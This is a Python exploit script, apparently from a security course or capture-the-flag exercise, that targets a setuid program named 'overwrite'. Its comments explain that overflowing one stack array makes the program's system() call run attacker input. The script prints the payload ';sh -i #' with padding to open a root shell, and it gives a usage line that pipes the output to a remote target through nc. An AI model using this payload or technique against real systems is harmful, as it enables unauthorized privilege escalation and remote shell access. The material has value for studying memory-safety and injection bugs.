#!/usr/bin/env python3

#
# This is an example of famous privilege escalation attack.
#
# This script exploits a program running on a remote machine to gain a root access.
#
# Program running on the remote machine is given as 'overwrite' and it is compiled with
# gcc -m32 -o overwrite overwrite.c which means it has all the default exploit protections such as
# stack canaries, non executable stack etc. Namely the attack we perform doesn’t try to change the return pointer
#
# Instead this script exploits a "stack overflow" bug in 'overwrite' that eventually allows us to
# execute any command we wish (i.e. as root) since 'overwrite' program has its "setuid" bit set.
#
# The source code of the program is also given as 'overwrite.c' but the exploit in the program can also be detected
# by the assembly code of 'overwrite' (i.e. using the output of "objdump -d overwrite" or with gdb)
#
# To run and actually test in your local: ./saldir.py | overwrite
# To hack and test in a remote machine that runs 'overwrite' (actual target): (./saldir.py; cat) | nc <IP_ADDR> <PORT>
#
# Yavuz Selim YESILYURT © 2020
#


def main():
	"""
		When one checks the disassembled version of 'overwrite' s/he can see
		that there are 2 array allocated consecutively as long one and then the short one
		but since compiler loves optimization a lot it allocates these as short one then the long one.
		Therefore we have a[256] then b[1024] consecutively. Program executes the content of a[256] + b[1024] as root
		namely it has setuid bit set and calls the 'system(concatenated_ab)' function. If we were to craft such an
		input that will first fill a[256] then overflow it so that b[1024]'s first character gets a null character '\0'
		(i.e. b[0]='\0') and 'strlen(b)' will terminate the loop and directly jump below.

		So in below we craft and input that executes our command and then pads the remaining space accordingly to make
		b[0] = '\0'
	"""
	magic = ";sh -i #"
	padding = '0' * (192 - (len(magic) + 1))
	print(magic + padding)


if __name__ == '__main__':
	main()
